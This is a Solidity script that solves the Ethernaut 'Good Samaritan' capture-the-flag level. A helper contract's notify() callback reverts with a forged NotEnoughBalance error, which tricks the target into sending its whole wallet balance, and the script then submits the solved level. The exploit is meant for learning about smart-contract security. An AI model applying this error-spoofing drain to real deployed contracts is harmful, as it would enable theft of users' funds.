// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {GoodSamaritan, Coin, Wallet} from "../src/GoodSamaritan.sol";

/**
 *
 * Level address: 0x36E92B2751F260D6a4749d7CA58247E7f8198284
 * This instance represents a Good Samaritan that is wealthy and ready to
 * donate some coins to anyone requesting it.
 *
 * Would you be able to drain all the balance from his Wallet?
 *
 * Things that might help:
 *
 * [Solidity Custom
 * Errors](https://soliditylang.org/blog/2021/04/21/custom-errors/)
 *
 */
contract Pawn {
    error NotEnoughBalance();

    GoodSamaritan public goodSamaritan;

    constructor(GoodSamaritan goodSamaritan_) {
        goodSamaritan = goodSamaritan_;
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount_) external view {
        Coin coin = Coin(goodSamaritan.coin());
        Wallet wallet = Wallet(goodSamaritan.wallet());
        uint256 currentBalance = coin.balances(address(wallet));

        if (amount_ <= currentBalance) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanScript is Attacker {
    Level private level = Level(0x36E92B2751F260D6a4749d7CA58247E7f8198284);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        GoodSamaritan goodSamaritan = GoodSamaritan(instance);
        Coin coin = Coin(goodSamaritan.coin());
        Wallet wallet = Wallet(goodSamaritan.wallet());

        Pawn pawn = new Pawn(goodSamaritan);
        pawn.attack();

        require(coin.balances(address(wallet)) == 0, "Level not solved");
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
